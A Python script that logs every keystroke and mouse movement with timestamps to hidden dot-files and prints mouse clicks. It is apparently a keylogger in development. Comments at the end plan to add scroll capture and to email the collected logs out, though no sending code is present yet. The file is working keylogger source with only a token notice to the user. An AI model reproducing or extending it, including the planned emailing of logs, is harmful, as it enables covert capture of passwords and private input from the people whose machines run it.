import keyboard
import pyautogui
import time
import threading
import datetime
import pynput

def recordKeys():
    while True:
        key = keyboard.read_key()
        event = keyboard.is_pressed(hotkey=key)
        if event:
            with open('.keys.txt', 'a') as file:
                clocktime = datetime.datetime.now().strftime("%r")
                file.write(f"'{key}'  At {clocktime}\n")
            


def mouseMonitor():
    size = pyautogui.size()
    with open('.mouse.txt', 'w') as file:
        file.write(f"Size: {size.width}x{size.height} \n")
    Xcopy, Ycopy = 0, 0
    
    while True:
        position = pyautogui.position()
        if position.x != Xcopy or position.y != Ycopy:
            with open('.mouse.txt', 'a') as file:
                clocktime = datetime.datetime.now().strftime("%r")
                file.write(f"Mouse Position: X: {position.x}   Y:{position.y}  At {clocktime}\n")
                Xcopy, Ycopy = position.x, position.y
                time.sleep(0.2)
    

def clickcheck(x, y, button, pressed, injected):
    if pressed:
        clocktime = datetime.datetime.now().strftime("%r")
        print(f"{button}  X:{x}  Y:{y}  at {clocktime}")
    

if __name__ == "__main__":
    print("Hello user...")
    print("I want to record some keys from your keyboard")
    keyboardThread = threading.Thread(target=recordKeys)
    mouseThread = threading.Thread(target=mouseMonitor)

    keyboardThread.start()
    mouseThread.start()

    with pynput.mouse.Listener(on_click=clickcheck) as listen:
        keyboardThread.join()
        mouseThread.join()
        listen.join()



# A new function is added to check the mouse click position and it is sucessfully working
# Now using the snippets, get the mouse scroll options and implement it in the code and then get the keyboard and mouse logs via email


# DON'T FORGOT TO ADD THE TRY AND EXCEPT BLOCK FOR ERROR HANDLING AND RESOLVING